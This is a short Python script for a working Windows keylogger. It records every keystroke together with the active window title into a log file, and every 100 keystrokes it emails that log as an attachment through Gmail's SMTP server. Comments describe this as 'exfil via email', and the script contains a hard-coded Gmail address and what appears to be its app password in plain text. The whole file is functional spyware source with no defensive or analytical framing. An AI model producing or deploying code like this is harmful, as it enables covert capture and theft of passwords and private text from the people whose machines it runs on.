import logging
#listening for 
from pynput.keyboard import Key, Listener

# relevant librarires for exfil via email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import win32gui

def get_active_window_title():
    # Get the handle of the foreground window
    hwnd = win32gui.GetForegroundWindow()
    
    # Get the text (title) of that window
    window_title = win32gui.GetWindowText(hwnd)
    
    return window_title

# email stuffs
email_address = "testingtemp568@gmail.com"
password = "gwms hvfz hnga gazm" 
toaddr = "testingtemp568@gmail.com" 

#make a log file
log_dir = "key_log.txt"

extend = "\\"
file_merge = log_dir + extend

# exfil via email to testing gmail account
def send_email(filename, attachment, toaddr):

    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "see attached"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

# send_email(log_dir, log_dir, toaddr)

logging.basicConfig(filename=(log_dir), level=logging.DEBUG, format="%(asctime)s: %(message)s")

count = 0

# send email every 100 keystrokes
def on_press(key):
    curr_window = get_active_window_title()
    logging.info(curr_window + " |" + str(key))
    global count
    count += 1
    if count == 100:
        send_email(log_dir, log_dir, toaddr)
        count = 0
    if key == Key.esc:
        return False

with Listener(on_press=on_press) as listener:
    listener.join()
